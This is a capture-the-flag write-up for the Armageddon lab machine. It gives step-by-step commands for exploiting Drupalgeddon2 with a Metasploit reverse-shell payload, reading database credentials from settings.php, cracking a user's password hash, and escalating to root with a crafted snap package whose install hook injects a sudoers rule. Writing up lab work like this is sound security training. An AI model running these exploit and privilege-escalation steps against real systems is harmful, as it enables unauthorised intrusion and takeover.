<img width="702" height="640" alt="image" src="https://github.com/user-attachments/assets/37e8ed7d-8425-48aa-ae74-d5a0f66ab085" />


# Armageddon Writeup: User & Root Flag via Snap Exploitation Guided Mode

We exploited a misconfigured `sudo` rule that allowed passwordless execution of `snap install` as root. By crafting a malicious Snap package using `fpm`, we injected a new rule into `/etc/sudoers`, granting full root access to the `brucetherealadmin` user. This allowed us to capture both the user and root flags.

> *How many TCP ports are open on Armageddon?*
> 

<img width="1287" height="211" alt="image" src="https://github.com/user-attachments/assets/0616ee75-8e59-4cdd-a06c-308584953ae1" />

Answer: **2**

> *What is the name of the content management system the website is using?*
> 

Look at the source page 

<img width="1389" height="298" alt="image" src="https://github.com/user-attachments/assets/369950a8-721c-4d7e-b1fd-18836de5ced2" />

Answer: **drupal**

> *What is the name given to the exploit that targets Drupal < 8.3.9 / < 8.4.6 / < 8.5.1?*
> 

Search for "drupal 7" in searchsploit.

<img width="1292" height="672" alt="image" src="https://github.com/user-attachments/assets/3d79b07c-2e3a-4a59-ad91-79d2ae894e1f" />

Answer: **drupalgeddon2**

> *What user is the webserver running as?*
> 

Find a POC exploit for Drupalgeddon2 and run it.

<img width="1300" height="385" alt="image" src="https://github.com/user-attachments/assets/3e180b1d-eb4e-479e-b8a8-ba0fc9423825" />

### Exploit Drupalgeddon2

<img width="1459" height="785" alt="image" src="https://github.com/user-attachments/assets/662c9804-c2b3-4385-9b8b-7fbdc485ae6d" />

### **Load the Exploit**

`use exploit/unix/webapp/drupal_drupalgeddon2`

**Set Target Options**

`set RHOSTS 10.129.48.89
set TARGETURI /`

**Set Payload**

`set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.14
set LPORT 4444`

**Run the Exploit**

`exploit`

once in 

<img width="1454" height="159" alt="image" src="https://github.com/user-attachments/assets/dc3cc70e-f9a9-4023-9e39-2492a47a8387" />

Answer: **apache**

> *What is the password for the MySQL database used by the site?*
> 

## Extract MySQL Password from Drupal

### **Locate** `settings.php`

Drupal stores its database credentials in:

Code

`sites/default/settings.php`

From your shell:

bash

`cat /var/www/html/sites/default/settings.php`

If the site is installed elsewhere (e.g., `/var/www/drupal/`), adjust the path accordingly.

<img width="1460" height="771" alt="image" src="https://github.com/user-attachments/assets/392e12d8-37b9-4b5f-bd32-485e6dd426ca" />

### **Look for** `$databases` **Array**

Inside `settings.php`, look for something like

<img width="1464" height="253" alt="image" src="https://github.com/user-attachments/assets/57d0e64a-5d03-4924-ad3a-6c57bb285ecb" />

Answer: **CQHEy@9M*m23gBVj’**

> *What is the name of the table in the Drupal database that holder usernames and password hashes?*
> 

run command 

```php
show tables
```

<img width="1455" height="772" alt="image" src="https://github.com/user-attachments/assets/0dd524d5-01c4-4904-9b53-05fb9eee9b6d" />

<img width="1458" height="109" alt="image" src="https://github.com/user-attachments/assets/871e02b1-f7cb-442e-b01b-64d94162658e" />

Answer: **users**

> *What is the brucetherealadmin's password?*
> 

i ran this 

```php
mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
```

<img width="1463" height="131" alt="image" src="https://github.com/user-attachments/assets/5b8d1535-5dac-4d70-8da8-155e1e80adec" />

found the hash then crack it using john 

<img width="1288" height="355" alt="image" src="https://github.com/user-attachments/assets/e73c9800-52d0-4442-b63b-332a45d0e3a9" />

Answer: **booboo**

> *Submit the flag located in the brucetherealadmin user's home directory.*
> 

i login through ssh using brucetherealadmin and cracked password 

<img width="1292" height="223" alt="image" src="https://github.com/user-attachments/assets/e1a43372-c2e9-4277-9585-47ac2eb9c178" />

right away got the user flag

> *What is the full path to the binary on this machine that brucetherealadmin can run as root?*
> 

here in ssh i ran `sudo -l` 

<img width="1293" height="114" alt="image" src="https://github.com/user-attachments/assets/5fcad4b9-220b-4835-98c5-b64052b7013e" />

Answer:**/usr/bin/snap**

> *Submit the flag located in root's home directory.*
> 

## Exploitation: Sudoers Injection via Snap Install Hook

### Step 1: Install `fpm` on Attacker Machine

`sudo apt update
sudo apt install ruby ruby-dev build-essential -y
sudo gem install --no-document fpm`

### Step 2: Craft Malicious Snap Package

`COMMAND="echo 'brucetherealadmin ALL=(ALL) NOPASSWD:/bin/bash' >> /etc/sudoers"
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" > meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta`

This creates `xxxx_1.0_all.snap` with an install hook that modifies `/etc/sudoers`.

### Step 3: Transfer to Target

`scp xxxx_1.0_all.snap brucetherealadmin@10.129.48.89:/home/brucetherealadmi`

<img width="1292" height="377" alt="image" src="https://github.com/user-attachments/assets/463cd6e9-62b6-4fef-b6b9-9ce0d2bc0a29" />

### Step 4: Install as Root

`sudo /usr/bin/snap install xxxx_1.0_all.snap --dangerous --devmode`

The install hook runs as root. Even though it returns `exit status 1`, the sudoers rule is injected.

## Privilege Escalation

Step 5: Spawn Root Shell

`sudo /bin/bash
whoami`

Output: `root`
<img width="1285" height="166" alt="image" src="https://github.com/user-attachments/assets/a5fff18e-18fc-4168-8e4b-13b33583efc5" />
<img width="1271" height="61" alt="image" src="https://github.com/user-attachments/assets/6363d2b8-d61c-4b52-89bb-a8c284ce4eba" />
